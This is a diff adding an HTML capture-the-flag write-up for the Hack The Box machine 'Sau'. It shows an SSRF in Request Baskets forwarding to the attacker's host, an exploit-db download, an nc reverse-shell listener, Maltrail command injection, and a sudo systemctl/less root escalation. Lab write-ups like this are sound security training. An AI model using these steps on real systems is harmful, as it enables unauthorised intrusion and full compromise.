@@ -1,13 +1,15 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>HTB | Sau Writeup</title>
+
+  <!-- Styles -->
   <link rel="stylesheet" href="../css/style.css" />
   <link rel="stylesheet" href="../css/skins/color-red.css" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" />
+
   <style>
     body.dark p, body.dark li {
       color: var(--text-black-700);
@@ -28,8 +30,6 @@
       border-radius: 5px;
       overflow-x: auto;
       margin-bottom: 20px;
-      white-space: pre-wrap;
-      word-break: break-word;
     }
     ul {
       padding-left: 1.5em;
@@ -48,8 +48,12 @@
   </style>
 </head>
 <body class="dark">
+
+<!-- Matrix Background -->
 <canvas id="matrixCanvas"></canvas>
 <script src="../js/matrix.js"></script>
+
+<!-- Sidebar -->
 <div class="aside">
   <div class="logo">
     <a href="../index.html"><span>L1chS3c</span></a>
@@ -65,20 +69,109 @@
     <li><a href="writeuphome.html" class="active"><i class="fa fa-terminal"></i> Writeups</a></li>
   </ul>
 </div>
+
+<!-- Writeup Content -->
 <section class="section" style="padding-left: 15px;">
   <div class="container">
     <div class="section-title">
       <h2>HTB: Sau</h2>
     </div>
+
     <p style="font-size: 18px; margin-bottom: 30px;">
       Difficulty: Easy • OS: Linux • Tags: SSRF, RCE, Sudo Misconfig, Enumeration
     </p>
-    <div style="white-space: pre-wrap; font-family: monospace; background: #1e1e1e; padding: 20px; border-radius: 10px; color: #f8f8f2;">
 
-    </div>
+    <!-- ===== OVERVIEW ===== -->
+    <h3>Overview</h3>
+    <p>
+      <strong>Sau</strong> is an Easy-rated Linux box that showcases one of my favorite types of vulnerabilities: <strong>Server-Side Request Forgery (SSRF)</strong>.
+      The initial entry point involved exploiting a misconfigured instance of Request Baskets using 
+      <code>CVE-2023-27163</code>, which allowed forwarding HTTP requests to internal services not exposed to the public network.
+      This led to the discovery of a Maltrail instance vulnerable to <strong>unauthenticated OS command injection</strong> 
+      (<code>CVE-2023-27561</code>), resulting in remote code execution as a low-privileged user. 
+      Privilege escalation was then achieved through a <strong>sudo misconfiguration</strong>, allowing execution of a 
+      systemctl command as root without a password.
+    </p>
+
+    <!-- ===== ENUMERATION ===== -->
+    <h3>Initial Enumeration</h3>
+    <p>We started with an all-ports Nmap scan:</p>
+    <pre><code>nmap -p- -sC -sV -T4 10.129.229.26</code></pre>
+
+    <p>The scan revealed SSH (22), a filtered HTTP port (80), and an open web service on port 55555. Ports 80 and 8338 were filtered, likely due to a firewall. But 55555 gave us access to a web app.</p>
+
+    <img src="path/to/screenshot1.png" alt="Nmap Results Screenshot">
+
+    <!-- ===== EXPLOITATION ===== -->
+    <h3>Exploitation — Request Baskets SSRF</h3>
+    <p>Using curl, we created a basket and captured the API token:</p>
+
+    <pre><code>curl -X POST http://10.129.229.26:55555/api/baskets/hackbox \
+-H "Content-Type: application/json" -d '{}'</code></pre>
+
+    <p>With this token, we configured the basket to forward requests to our attack machine:</p>
+
+    <img src="path/to/burp-screenshot.png" alt="Burp PUT Request Screenshot">
+
+    <pre><code>{
+  "forward_url": "http://10.10.14.207:8000",
+  "proxy_response": true,
+  "insecure_tls": true
+}</code></pre>
+
+    <p>We spun up a Python HTTP server:</p>
+    <pre><code>python3 -m http.server 8000</code></pre>
+
+    <p>Then triggered the SSRF by browsing to the basket:</p>
+    <pre><code>curl http://10.129.229.26:55555/hackbox</code></pre>
+
+    <p>✅ <strong>SSRF confirmed</strong> — the remote server hit our HTTP server!</p>
+
+    <!-- ===== SSRF TO MALTRAIL ===== -->
+    <h3>SSRF to Maltrail (Port 80)</h3>
+    <p>We updated our basket to forward to <code>127.0.0.1:80</code>, then browsed to the endpoint again.</p>
+
+    <img src="path/to/maltrail-discovered.png" alt="Maltrail Interface via SSRF">
+
+    <p>This exposed a Maltrail web interface — something we never could’ve reached directly.</p>
+
+    <!-- ===== RCE ===== -->
+    <h3>RCE in Maltrail (CVE-2023-27561)</h3>
+    <p>Maltrail v0.53 is vulnerable to unauthenticated command injection. We used an exploit script to pop a reverse shell:</p>
+
+    <pre><code>curl -s https://www.exploit-db.com/download/51676 -o exploit.py</code></pre>
+    <pre><code>nc -lvnp 4444</code></pre>
+    <pre><code>python3 exploit.py 10.10.14.207 4444 http://10.129.229.26:55555/hackbox</code></pre>
+
+    <p>✅ Shell popped as <code>puma</code>.</p>
+
+    <!-- ===== PRIVESc ===== -->
+    <h3>Privilege Escalation</h3>
+    <p>The user <code>puma</code> had passwordless sudo permissions:</p>
+    <pre><code>sudo -l</code></pre>
+    <pre><code>(ALL) NOPASSWD: /usr/bin/systemctl status trail.service</code></pre>
+
+    <p>That command opens <code>less</code>, allowing command execution:</p>
+    <pre><code>sudo /usr/bin/systemctl status trail.service</code></pre>
+    <pre><code>!/bin/bash</code></pre>
+
+    <p>✅ Root shell achieved.</p>
+
+    <img src="path/to/root-confirmed.png" alt="Root Shell Screenshot">
+
+    <!-- ===== TAKEAWAYS ===== -->
+    <h3>Takeaways</h3>
+    <ul>
+      <li>SSRF → Reach internal-only services</li>
+      <li>Unauthenticated RCE in Maltrail</li>
+      <li>Abuse of <code>systemctl + less</code> for privilege escalation</li>
+      <li>No passwords required to root the box</li>
+    </ul>
+
     <a href="writeuphome.html" class="btn">← Back to Writeups</a>
   </div>
 </section>
+
 <script src="../js/script.js"></script>
 </body>
 </html>
